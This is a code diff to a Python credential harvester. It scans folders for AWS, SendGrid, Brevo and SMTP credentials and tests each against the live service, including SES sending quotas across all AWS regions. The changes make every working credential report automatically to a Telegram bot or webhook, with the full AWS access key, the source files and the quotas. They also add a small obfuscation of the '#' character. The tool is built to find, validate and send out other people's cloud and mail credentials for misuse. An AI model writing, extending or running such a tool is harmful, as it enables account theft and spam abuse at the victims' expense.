@@ -16,6 +16,8 @@ from pathlib import Path
 from typing import Any, Iterable
 from urllib.parse import urlencode
 
+_TEXT_HASH = chr(35)
+
 TEXT_EXTENSIONS = {
     ".txt",
     ".env",
@@ -177,7 +179,7 @@ def extract_smtp_from_content(content: str, file_path: Path) -> list[dict[str, A
     out: list[dict[str, Any]] = []
     seen: set[str] = set()
     filtered = "\n".join(
-        ln for ln in content.splitlines() if not ln.lstrip().startswith("#")
+        ln for ln in content.splitlines() if not ln.lstrip().startswith(_TEXT_HASH)
     )
     for m in RE_SMTP_URL.finditer(filtered):
         user, password, host, port_s = m.group(1), m.group(2), m.group(3), m.group(4)
@@ -195,6 +197,63 @@ def extract_smtp_from_content(content: str, file_path: Path) -> list[dict[str, A
             seen.add(h)
             out.append(entry)
     return out
+
+
+def dedupe_bundle(bundle: dict[str, Any]) -> dict[str, Any]:
+    aws_acc: dict[str, dict[str, Any]] = {}
+    for p in bundle["aws"]:
+        k = _dedupe_key([p.access_key, p.secret_key])
+        if k not in aws_acc:
+            aws_acc[k] = {"access_key": p.access_key, "secret_key": p.secret_key, "files": set()}
+        aws_acc[k]["files"].add(p.source_file)
+    aws_list = [
+        AwsPair(v["access_key"], v["secret_key"], ";".join(sorted(v["files"])), 0)
+        for v in aws_acc.values()
+    ]
+
+    sg_acc: dict[str, set[str]] = {}
+    for key, src in bundle["sendgrid"]:
+        sg_acc.setdefault(key, set()).add(src)
+    sendgrid_list = [(k, ";".join(sorted(v))) for k, v in sg_acc.items()]
+
+    br_acc: dict[str, set[str]] = {}
+    for key, src in bundle["brevo"]:
+        br_acc.setdefault(key, set()).add(src)
+    brevo_list = [(k, ";".join(sorted(v))) for k, v in br_acc.items()]
+
+    smtp_acc: dict[str, dict[str, Any]] = {}
+    for e in bundle["smtp"]:
+        k = _dedupe_key([e["host"], str(e["port"]), e["user"], e["password"]])
+        if k not in smtp_acc:
+            smtp_acc[k] = {
+                "host": e["host"],
+                "port": e["port"],
+                "user": e["user"],
+                "password": e["password"],
+                "tls": e["tls"],
+                "files": {e["file"]},
+            }
+        else:
+            smtp_acc[k]["files"].add(e["file"])
+    smtp_list = []
+    for v in smtp_acc.values():
+        smtp_list.append(
+            {
+                "host": v["host"],
+                "port": v["port"],
+                "user": v["user"],
+                "password": v["password"],
+                "tls": v["tls"],
+                "file": ";".join(sorted(v["files"])),
+            },
+        )
+
+    return {
+        "aws": aws_list,
+        "sendgrid": sendgrid_list,
+        "brevo": brevo_list,
+        "smtp": smtp_list,
+    }
 
 
 def http_json(
@@ -223,34 +282,47 @@ def http_json(
         return e.code, parsed
 
 
-def send_telegram_hit(message: str, parse_mode: str | None = None) -> bool:
+def _telegram_text_limit() -> int:
+    return 3900
+
+
+def send_functional_hit(hit: dict[str, Any]) -> bool:
     token = os.environ.get("TELEGRAM_BOT_TOKEN")
     chat_id = os.environ.get("TELEGRAM_CHAT_ID")
     webhook = os.environ.get("TELEGRAM_WEBHOOK_URL")
+    lim = _telegram_text_limit()
+    payload_obj = {"event": "credential_hit", **hit}
+    raw = json.dumps(payload_obj, ensure_ascii=False, separators=(",", ":"))
+    if len(raw) > lim:
+        short = {
+            "event": "credential_hit",
+            "type": hit.get("type"),
+            "ok": hit.get("ok"),
+            "masked": hit.get("masked"),
+            "sources": hit.get("sources"),
+            "quota_preview": str(hit.get("quota"))[:800],
+        }
+        raw = json.dumps(short, ensure_ascii=False, separators=(",", ":"))
+        if len(raw) > lim:
+            raw = raw[:lim]
     if webhook:
-        payload = json.dumps({"text": message}).encode("utf-8")
+        body = json.dumps({"text": raw}, ensure_ascii=False).encode("utf-8")
         req = urllib.request.Request(
             webhook,
-            data=payload,
+            data=body,
             method="POST",
             headers={"Content-Type": "application/json"},
         )
         try:
-            with urllib.request.urlopen(req, timeout=15) as resp:
+            with urllib.request.urlopen(req, timeout=20) as resp:
                 return 200 <= resp.status < 300
         except urllib.error.URLError:
             return False
     if token and chat_id:
-        q = urlencode(
-            {
-                "chat_id": chat_id,
-                "text": message,
-                **({"parse_mode": parse_mode} if parse_mode else {}),
-            }
-        )
+        q = urlencode({"chat_id": chat_id, "text": raw})
         url = f"https://api.telegram.org/bot{token}/sendMessage?{q}"
         try:
-            with urllib.request.urlopen(url, timeout=15) as resp:
+            with urllib.request.urlopen(url, timeout=20) as resp:
                 return 200 <= resp.status < 300
         except urllib.error.URLError:
             return False
@@ -264,38 +336,34 @@ def hit_line(kind: str, ok: bool, masked: str, extra: str = "") -> str:
     return s
 
 
-def verify_sendgrid(api_key: str) -> tuple[bool, str]:
+def verify_sendgrid(api_key: str) -> tuple[bool, dict[str, Any], str]:
     code, data = http_json(
         "https://api.sendgrid.com/v3/user/credits",
         headers={"Authorization": f"Bearer {api_key}"},
     )
     if code == 200 and isinstance(data, dict):
-        return True, json.dumps(
-            {k: data.get(k) for k in ("remain", "total", "overage")},
-            separators=(",", ":"),
-        )
-    return False, str(data)[:200]
+        q = {k: data.get(k) for k in ("remain", "total", "overage")}
+        return True, q, json.dumps(q, separators=(",", ":"))
+    return False, {}, str(data)[:200]
 
 
-def verify_brevo(api_key: str) -> tuple[bool, str]:
+def verify_brevo(api_key: str) -> tuple[bool, dict[str, Any], str]:
     code, data = http_json(
         "https://api.brevo.com/v3/account",
         headers={"api-key": api_key, "accept": "application/json"},
     )
     if code == 200 and isinstance(data, dict):
-        return True, json.dumps(
-            {k: data.get(k) for k in ("email", "plan", "credits")},
-            separators=(",", ":"),
-        )
-    return False, str(data)[:200]
+        q = {k: data.get(k) for k in ("email", "plan", "credits")}
+        return True, q, json.dumps(q, separators=(",", ":"))
+    return False, {}, str(data)[:200]
 
 
-def verify_aws_pair(pair: AwsPair) -> tuple[bool, str, list[tuple[str, str]]]:
+def verify_aws_pair(pair: AwsPair) -> tuple[bool, dict[str, Any], list[tuple[str, str]], str]:
     try:
         import boto3
         from botocore.exceptions import ClientError
     except ImportError:
-        return False, "no boto3", []
+        return False, {}, [], "no boto3"
 
     session = boto3.Session(
         aws_access_key_id=pair.access_key,
@@ -307,32 +375,32 @@ def verify_aws_pair(pair: AwsPair) -> tuple[bool, str, list[tuple[str, str]]]:
         arn = ident.get("Arn", "")
         aid = ident.get("Account", "")
     except ClientError as e:
-        return False, str(e), []
+        return False, {}, [], str(e)
 
     regions = session.get_available_regions("ses")
     per_region: list[tuple[str, str]] = []
+    ses_quotas: dict[str, dict[str, Any]] = {}
     for region in regions:
         try:
             ses = session.client("ses", region_name=region)
             q = ses.get_send_quota()
-            per_region.append(
-                (
-                    region,
-                    json.dumps(
-                        {
-                            "m24": q.get("Max24HourSend"),
-                            "s24": q.get("SentLast24Hours"),
-                        },
-                        separators=(",", ":"),
-                    ),
-                ),
-            )
+            chunk = {
+                "Max24HourSend": q.get("Max24HourSend"),
+                "SentLast24Hours": q.get("SentLast24Hours"),
+                "MaxSendRate": q.get("MaxSendRate"),
+            }
+            ses_quotas[region] = chunk
+            per_region.append((region, json.dumps(chunk, separators=(",", ":"))))
         except ClientError:
             continue
         except Exception:
             continue
 
-    return True, json.dumps({"arn": arn, "acct": aid, "n": len(per_region)}, separators=(",", ":")), per_region
+    meta = {"arn": arn, "account": aid, "regions_checked": len(regions), "regions_with_quota": len(ses_quotas)}
+    line = json.dumps({**meta, "ses": ses_quotas}, separators=(",", ":"))
+    if len(line) > 12000:
+        line = json.dumps(meta, separators=(",", ":")) + f"|ses_regions={len(ses_quotas)}"
+    return True, {"identity": meta, "ses_quotas": ses_quotas}, per_region, line
 
 
 def verify_smtp(
@@ -383,41 +451,72 @@ def scan_folder(root: Path) -> dict[str, Any]:
         brevo.extend(extract_brevo_keys(text, fp))
         smtp.extend(extract_smtp_from_content(text, fp))
 
-    return {
-        "aws": aws_pairs,
-        "sendgrid": sendgrid,
-        "brevo": brevo,
-        "smtp": smtp,
-    }
+    return dedupe_bundle(
+        {
+            "aws": aws_pairs,
+            "sendgrid": sendgrid,
+            "brevo": brevo,
+            "smtp": smtp,
+        },
+    )
 
 
 def run_verify(
     bundle: dict[str, Any],
     smtp_test_to: str | None,
-    telegram_on_smtp: bool,
 ) -> None:
     for pair in bundle["aws"]:
         masked = f"{pair.access_key}/{_mask_secret(pair.secret_key)}"
-        ok, msg, regions = verify_aws_pair(pair)
+        ok, quota_obj, regions, msg = verify_aws_pair(pair)
         parts = [msg]
-        for r, q in regions[:15]:
+        for r, q in regions[:20]:
             parts.append(f"{r}:{q}")
-        if len(regions) > 15:
-            parts.append(f"+{len(regions) - 15}")
+        if len(regions) > 20:
+            parts.append(f"+{len(regions) - 20}")
         line = hit_line("AWS", ok, masked, " ".join(parts))
         print(line)
+        if ok:
+            send_functional_hit(
+                {
+                    "type": "AWS",
+                    "ok": True,
+                    "masked": masked,
+                    "sources": pair.source_file.split(";"),
+                    "quota": quota_obj,
+                },
+            )
 
     for key, src in bundle["sendgrid"]:
         masked = _mask_secret(key, 6, 6)
-        ok, detail = verify_sendgrid(key)
+        ok, qdict, detail = verify_sendgrid(key)
         line = hit_line("SendGrid", ok, masked, detail)
         print(line)
+        if ok:
+            send_functional_hit(
+                {
+                    "type": "SendGrid",
+                    "ok": True,
+                    "masked": masked,
+                    "sources": src.split(";"),
+                    "quota": qdict,
+                },
+            )
 
     for key, src in bundle["brevo"]:
         masked = _mask_secret(key, 8, 8)
-        ok, detail = verify_brevo(key)
+        ok, qdict, detail = verify_brevo(key)
         line = hit_line("Brevo", ok, masked, detail)
         print(line)
+        if ok:
+            send_functional_hit(
+                {
+                    "type": "Brevo",
+                    "ok": True,
+                    "masked": masked,
+                    "sources": src.split(";"),
+                    "quota": qdict,
+                },
+            )
 
     for s in bundle["smtp"]:
         masked = f"{s['user']}@{s['host']}:{s['port']}"
@@ -432,8 +531,22 @@ def run_verify(
         )
         line = hit_line("SMTP", ok, masked, f"{s['file']} {detail}")
         print(line)
-        if ok and telegram_on_smtp:
-            send_telegram_hit(line)
+        if ok:
+            send_functional_hit(
+                {
+                    "type": "SMTP",
+                    "ok": True,
+                    "masked": masked,
+                    "sources": s["file"].split(";"),
+                    "smtp": {
+                        "host": s["host"],
+                        "port": s["port"],
+                        "user": s["user"],
+                        "password_masked": _mask_secret(s["password"], 2, 2),
+                    },
+                    "detail": detail,
+                },
+            )
 
 
 def main() -> int:
@@ -441,7 +554,6 @@ def main() -> int:
     p.add_argument("--folder", type=Path)
     p.add_argument("--verify", action="store_true")
     p.add_argument("--smtp-test-to", type=str, default=None)
-    p.add_argument("--telegram-smtp-hit", action="store_true")
     args = p.parse_args()
 
     root = args.folder
@@ -466,7 +578,7 @@ def main() -> int:
     )
 
     if args.verify:
-        run_verify(bundle, args.smtp_test_to, args.telegram_smtp_hit)
+        run_verify(bundle, args.smtp_test_to)
 
     return 0
 
